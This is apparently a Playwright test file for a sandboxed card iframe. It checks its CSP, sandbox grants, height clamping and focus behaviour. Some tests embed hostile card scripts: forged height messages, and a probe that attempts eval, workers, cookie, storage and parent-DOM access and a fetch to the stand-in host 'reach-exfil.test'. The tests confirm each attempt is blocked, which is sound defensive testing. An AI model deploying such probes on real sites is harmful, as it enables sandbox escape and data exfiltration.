// SandboxFrame in a real browser. Every routed card document is a real response of the production mint and serve
// routes, so the policy the browser enforces is the policy the server emits.
import { buildCardFrameCsp, CARD_FRAME_SAFE_FLOOR, foldCardFrameHeight } from "@orb/kit/card-frame";
import { expect } from "@orb/testkit/ct-corpus";
import { TOKENS } from "@orb/ui/tokens";
import type { Locator, Page } from "@playwright/test";
import type { FocusedBesideFrameStory, SandboxFrameStory } from "./_frame-stories.tsx";
import type { ServedFrame } from "./_served-frame.ts";
import { routeServedFrame, test } from "./_served-frame.ts";

const STORY = "tests/ui/content/sandbox-frame/_frame-stories/SandboxFrameStory";
const FOCUS_STORY = "tests/ui/content/sandbox-frame/_frame-stories/FocusedBesideFrameStory";
const FRAME = '[data-slot="sandbox-frame"]';
// Both bounds come from the production fold, not from a restated number.
const HEIGHT_CAP_PX = foldCardFrameHeight(undefined, { orbCardFrameHeight: Number.MAX_SAFE_INTEGER });
const MARK_RAN = 'document.body.setAttribute("data-card-ran","1");';
// The reviewed sandbox grants, spelled out on purpose: they are the contract under test, so a widened production
// constant must fail here rather than flow into both the expectation and the frame.
const ROUTED_SANDBOX_GRANT = "allow-scripts";
const FLOOR_SANDBOX_GRANT = "";

const script = (code: string): string => `<script>${code}</script>`;

const frameHeight = async (frame: Locator): Promise<number> => (await frame.boundingBox())?.height ?? 0;

/** Two animation frames order after every task queued before them, so "nothing moved" is not a race against a sleep. */
async function settle(page: Page): Promise<void> {
  await page.evaluate(
    async () =>
      await new Promise<void>((resolve) => {
        requestAnimationFrame(() => {
          requestAnimationFrame(() => {
            resolve();
          });
        });
      }),
  );
}

function collectConsoleErrors(page: Page): string[] {
  const errors: string[] = [];
  page.on("console", (message) => {
    if (message.type() === "error") {
      errors.push(message.text());
    }
  });
  return errors;
}

function directive(csp: string, name: string): string {
  const found = csp.split("; ").find((part) => part.startsWith(`${name} `));
  if (found === undefined) {
    throw new Error(`the served policy names no ${name}`);
  }
  return found;
}

/** The routed arm's props for one real served document. */
const routed = (served: ServedFrame, title: string): { readonly html: string; readonly title: string; readonly src: string } => ({
  html: "<p>unused</p>",
  title,
  src: served.url,
});

test("the srcdoc floor is script-dead: its sandbox grants nothing and an authored script never runs", async ({ mount, page }) => {
  const root = await mount<typeof SandboxFrameStory>(STORY, { html: `<p>card</p>${script(MARK_RAN)}`, title: "floor card" });
  const frame = root.locator(FRAME);
  await expect(frame).toHaveAttribute("data-delivery", "srcdoc");
  await expect(frame).toHaveAttribute("sandbox", FLOOR_SANDBOX_GRANT);
  await expect(frame).not.toHaveAttribute("src");
  // The card parsed, so the absent marker is about execution and not a document that never loaded.
  await expect(page.frameLocator(FRAME).locator("p")).toHaveText("card");
  await expect(page.frameLocator(FRAME).locator("body")).not.toHaveAttribute("data-card-ran", "1");
});

test("the srcdoc floor carries the production meta policy, and only the external-media verdict widens it", async ({ mount }) => {
  const metaPolicy = async (props: { readonly allowExternalMedia?: boolean }): Promise<string | null> => {
    const root = await mount<typeof SandboxFrameStory>(STORY, { html: "<p>x</p>", title: "floor card", ...props });
    const srcdoc = (await root.locator(FRAME).getAttribute("srcdoc")) ?? "";
    return /<meta http-equiv="Content-Security-Policy" content="([^"]*)">/u.exec(srcdoc)?.[1] ?? null;
  };
  expect(await metaPolicy({})).toBe(buildCardFrameCsp(CARD_FRAME_SAFE_FLOOR, "meta", "static"));
  expect(await metaPolicy({ allowExternalMedia: true })).toBe(buildCardFrameCsp({ ...CARD_FRAME_SAFE_FLOOR, allowExternalMedia: true }, "meta", "static"));
});

test("the routed arm emits src and no srcdoc, under exactly the reviewed sandbox grant on the frame and the served policy", async ({ mount, room, page }) => {
  const served = await room.serve("<p>card</p>", null);
  await routeServedFrame(page, served);
  const frame = (await mount<typeof SandboxFrameStory>(STORY, routed(served, "routed card"))).locator(FRAME);
  await expect(frame).toHaveAttribute("src", served.url);
  await expect(frame).toHaveAttribute("data-delivery", "routed");
  await expect(frame).not.toHaveAttribute("srcdoc");
  await expect(frame).toHaveAttribute("sandbox", ROUTED_SANDBOX_GRANT);
  expect(directive(served.csp, "sandbox")).toBe(`sandbox ${ROUTED_SANDBOX_GRANT}`);
});

test("an incomplete card shows a skeleton, not the frame", async ({ mount }) => {
  const root = await mount<typeof SandboxFrameStory>(STORY, { html: "<p>x</p>", title: "x", complete: false });
  await expect(root.locator('[data-slot="sandbox-frame-skeleton"]')).toBeVisible();
  await expect(root.locator(FRAME)).toHaveCount(0);
});

test("the frame is named in the tab order, even for a caller that passes an empty title", async ({ mount }) => {
  const root = await mount<typeof SandboxFrameStory>(STORY, { html: "<p>x</p>", title: "The Watcher" });
  await expect(root.locator(FRAME)).toHaveAccessibleName("The Watcher");
  const unnamed = await mount<typeof SandboxFrameStory>(STORY, { html: "<p>x</p>", title: "" });
  await expect(unnamed.locator(FRAME)).not.toHaveAccessibleName("");
});

test("a short static card measures itself and the frame drops below its pre-measurement height", async ({ mount, room, page }) => {
  const served = await room.serve('<div style="height:120px">short</div>', null);
  expect(served.granted.interactive).toBe(false);
  await routeServedFrame(page, served);
  const frame = (await mount<typeof SandboxFrameStory>(STORY, routed(served, "short card"))).locator(FRAME);
  await expect.poll(async () => frameHeight(frame)).toBe(120);
});

test("an oversize self-report clamps to the cap", async ({ mount, room, page }) => {
  const served = await room.serve('<div style="height:5000px">tall</div>', null);
  await routeServedFrame(page, served);
  const frame = (await mount<typeof SandboxFrameStory>(STORY, routed(served, "tall card"))).locator(FRAME);
  await expect.poll(async () => frameHeight(frame)).toBe(HEIGHT_CAP_PX);
});

test("a card-authored script is refused by the served policy and cannot drive the height", async ({ mount, room, page }) => {
  const errors = collectConsoleErrors(page);
  const hostile = `<div style="height:100px">card</div>${script(`${MARK_RAN}parent.postMessage({orbCardFrameHeight:5000},"*");`)}`;
  const served = await room.serve(hostile, null);
  await routeServedFrame(page, served);
  const frame = (await mount<typeof SandboxFrameStory>(STORY, routed(served, "hostile card"))).locator(FRAME);
  // The frame's own measurement lands; a forged 5000 would have clamped to the cap, and it runs at parse, before ours.
  await expect.poll(async () => frameHeight(frame)).toBe(100);
  await settle(page);
  expect(await frameHeight(frame)).toBe(100);
  const refusal = errors.find((line) => line.includes("violates the following Content Security Policy directive"));
  expect(refusal).toBeDefined();
  expect(refusal).toContain(directive(served.csp, "script-src"));
  await expect(page.frameLocator(FRAME).locator("div")).toHaveText("card");
  await expect(page.frameLocator(FRAME).locator("body")).not.toHaveAttribute("data-card-ran", "1");
});

test("a height message from another window is ignored: the sender is authenticated by window identity", async ({ mount, room, page }) => {
  const served = await room.serve('<div style="height:100px">card</div>', null);
  await routeServedFrame(page, served);
  const frame = (await mount<typeof SandboxFrameStory>(STORY, routed(served, "card"))).locator(FRAME);
  await expect.poll(async () => frameHeight(frame)).toBe(100);
  await page.evaluate(() => {
    window.postMessage({ orbCardFrameHeight: 700 }, "*");
  });
  await settle(page);
  expect(await frameHeight(frame)).toBe(100);
});

test("the srcdoc floor does not self-measure: the caller's height stands", async ({ mount, page }) => {
  const root = await mount<typeof SandboxFrameStory>(STORY, { html: '<div style="height:60px">short</div>', title: "floor", heightPx: 200 });
  await settle(page);
  expect(await frameHeight(root.locator(FRAME))).toBe(200);
});

test("an interactive card's own script runs inside the frame under the served policy", async ({ mount, room, page }) => {
  const served = await room.serve(`<div style="height:100px">card</div>${script(MARK_RAN)}`);
  expect(served.granted.interactive).toBe(true);
  await routeServedFrame(page, served);
  await mount<typeof SandboxFrameStory>(STORY, routed(served, "interactive card"));
  await expect(page.frameLocator(FRAME).locator("body")).toHaveAttribute("data-card-ran", "1");
});

test("the interactive grant keeps the height channel working with no second allowance", async ({ mount, room, page }) => {
  const served = await room.serve('<div style="height:120px">short</div>');
  expect(served.granted.interactive).toBe(true);
  await routeServedFrame(page, served);
  const frame = (await mount<typeof SandboxFrameStory>(STORY, routed(served, "short interactive card"))).locator(FRAME);
  await expect.poll(async () => frameHeight(frame)).toBe(120);
});

test("an interactive card can forge the height message and the clamp is what holds", async ({ mount, room, page }) => {
  const served = await room.serve(`<div style="height:100px">card</div>${script('parent.postMessage({orbCardFrameHeight:99999},"*");')}`);
  await routeServedFrame(page, served);
  const frame = (await mount<typeof SandboxFrameStory>(STORY, routed(served, "forging card"))).locator(FRAME);
  await expect.poll(async () => frameHeight(frame)).toBe(HEIGHT_CAP_PX);
  await settle(page);
  expect(await frameHeight(frame)).toBe(HEIGHT_CAP_PX);
});

test("an interactive card reaches nothing new: no eval, no worker, no storage, no parent, no network", async ({ mount, room, page }) => {
  const probe = script(
    [
      "window.__reach={violated:[]};",
      'document.addEventListener("securitypolicyviolation",(e)=>{window.__reach.violated.push(e.effectiveDirective+" "+e.blockedURI);});',
      'const t=(k,f)=>{try{f();window.__reach[k]="allowed";}catch(e){window.__reach[k]="refused:"+e.name;}};',
      'const w=(k,u)=>{try{const x=new Worker(u);x.onmessage=()=>{window.__reach[k]="allowed";};x.onerror=()=>{window.__reach[k]="refused:error";};}catch(e){window.__reach[k]="refused:"+e.name;}};',
      't("eval",()=>{eval("1+1");});',
      't("newFunction",()=>{new Function("return 1")();});',
      'w("blobWorker",URL.createObjectURL(new Blob(["postMessage(1)"],{type:"text/javascript"})));',
      'w("dataWorker","data:text/javascript,postMessage(1)");',
      't("cookie",()=>{void document.cookie;});',
      't("localStorage",()=>{void localStorage.length;});',
      't("parentDom",()=>{void parent.document.title;});',
      'fetch("https://reach-exfil.test/x").then(()=>{window.__reach.fetch="allowed";},(e)=>{window.__reach.fetch="refused:"+e.name;});',
      MARK_RAN,
    ].join(""),
  );
  const served = await room.serve(`<p>reach</p>${probe}`);
  // The far end answers any request it receives, so a fetch the policy allowed would land here and read "allowed".
  const exfil: string[] = [];
  await page.route("https://reach-exfil.test/**", async (route) => {
    exfil.push(route.request().url());
    await route.fulfill({ status: 200, headers: { "access-control-allow-origin": "*" }, body: "ok" });
  });
  await routeServedFrame(page, served);
  await mount<typeof SandboxFrameStory>(STORY, routed(served, "reach card"));
  const body = page.frameLocator(FRAME).locator("body");
  // The marker proves the script ran under the grant, so each refusal below is a real one.
  await expect(body).toHaveAttribute("data-card-ran", "1");
  const handle = await (await page.locator(FRAME).elementHandle()).contentFrame();
  if (handle === null) {
    throw new Error("routed iframe has no content frame");
  }
  const reach = async (): Promise<Record<string, unknown>> => await handle.evaluate(() => (globalThis as { __reach?: Record<string, unknown> }).__reach ?? {});
  await expect.poll(reach).toMatchObject({
    eval: "refused:EvalError",
    newFunction: "refused:EvalError",
    // A worker the policy allowed would post back and read "allowed"; a refused one fires its error event.
    blobWorker: "refused:error",
    dataWorker: "refused:error",
    cookie: "refused:SecurityError",
    localStorage: "refused:SecurityError",
    parentDom: "refused:SecurityError",
    fetch: "refused:TypeError",
  });
  // Each worker died on the served policy (worker-src falls back to script-src), not on an unrelated failure.
  expect((await reach())["violated"]).toEqual(expect.arrayContaining(["worker-src blob", "worker-src data"]));
  expect(exfil).toEqual([]);
});

test("a frame that focuses itself on load does not take the page's focus", async ({ mount, room, page }) => {
  const served = await room.serve(`<button id="grab">play</button>${script(`document.getElementById("grab").focus();${MARK_RAN}`)}`);
  await routeServedFrame(page, served);
  const root = await mount<typeof FocusedBesideFrameStory>(FOCUS_STORY, routed(served, "grabby card"));
  // The marker proves the grab ran inside the frame, so the focus assertion below is about the host taking it back.
  await expect(page.frameLocator(FRAME).locator("body")).toHaveAttribute("data-card-ran", "1");
  await settle(page);
  await expect(root.getByRole("textbox", { name: "Outside the frame", exact: true })).toBeFocused();
});

test("a frame that outgrows its box scrolls inside itself with the thin themed bar", async ({ mount, room, page }) => {
  // The bar is tinted from the frame's foreground token, so the served document needs the theme token to resolve it.
  const served = await room.serve('<div style="height:3000px">tall</div>', null, {
    "--sandbox-bg": TOKENS["color.primary"].value,
    "--sandbox-fg": TOKENS["color.user-bubble"].value,
  });
  await routeServedFrame(page, served);
  await mount<typeof SandboxFrameStory>(STORY, routed(served, "tall card"));
  const handle = await (await page.locator(FRAME).elementHandle()).contentFrame();
  if (handle === null) {
    throw new Error("routed iframe has no content frame");
  }
  await expect(handle.locator("div")).toHaveText("tall");
  const readBar = (): Promise<{ readonly width: string; readonly color: string }> =>
    handle.evaluate(() => {
      const style = getComputedStyle(document.documentElement);
      return { width: style.scrollbarWidth, color: style.scrollbarColor };
    });
  await expect.poll(async () => (await readBar()).width).toBe("thin");
  await expect.poll(async () => (await readBar()).color).not.toBe("auto");
});
